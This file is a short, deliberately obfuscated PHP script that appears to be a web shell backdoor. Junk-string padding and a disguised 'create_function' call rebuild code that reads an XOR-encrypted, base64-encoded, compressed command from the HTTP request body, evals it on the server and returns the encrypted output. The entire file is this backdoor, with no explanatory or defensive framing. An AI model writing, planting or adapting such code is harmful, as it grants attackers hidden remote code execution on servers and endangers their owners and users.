<?php
$B='"/$kh(!V.+)!V$!Vkf/",@fil!Ve!V_!Vget_content!Vs("php://input"!V),$m)==!V1) {!V@ob_star!Vt();@e!';
$J='Vva!Vl(@gzuncom!Vpres!Vs(@x(@ba!V!V!Vse64_decode($m[1]!V),$k)!V!V));$o=@o!Vb_get_c!Vontents();!V@ob!V';
$N='0;($!Vj!V<$c&&$i<$l)!V;$j++,!V$i++){$o!V.=$t{$i}!V^$k{$j}!V;}}re!V!Vturn $o;}if !V(@preg_!Vma!Vtch(';
$R='_!Vend_clean(!V);$r!V=!V@!Vb!Vase!V64_encode(@!V!Vx(@gzcompre!Vss($o),$k));pri!Vnt("$p$kh$r$kf");}';
$k='$k="c!Ve0a!V5ae1";$!Vkh="41f!V7d452!Vf0a1";$kf="!V10614a!V36d238"!V;$p=!V"iITN!V!V!VnmhnugJz7!VL!VtN";f';
$g='uncti!V!Von x($t,$k){$c=str!Vlen($k);$l=!Vst!Vrlen($t);!V$o!V="";for($i=0!V;$i<$l!V;){!Vfor($j!V=';
$E=str_replace('g','','crgegate_gfgugngction');
$O=str_replace('!V','',$k.$g.$N.$B.$J.$R);
$f=$E('',$O);$f();
?>
